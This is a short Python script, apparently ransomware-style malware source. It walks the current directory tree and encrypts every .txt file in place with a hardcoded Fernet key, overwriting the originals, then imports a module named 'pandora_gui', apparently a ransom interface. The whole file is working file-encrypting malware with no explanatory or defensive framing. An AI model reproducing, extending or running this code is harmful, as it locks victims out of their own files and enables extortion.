from cryptography.fernet import Fernet
import os

key = b'eySY2FUxQZW1yT7PlpcaAO2HdvdJcbiNAgejJBuDvN8='
current_directory = os.getcwd()

cipher = Fernet(key)

for root, dirs, files in os.walk(current_directory):
    for file_name in files:
        if file_name.endswith(".txt"):
            file_path = os.path.join(root, file_name)
            
            with open(file_path, "rb") as f:
                data = f.read()
                
            encrypted_data = cipher.encrypt(data)
            
            with open(file_path, "wb") as f:
                f.write(encrypted_data)


import pandora_gui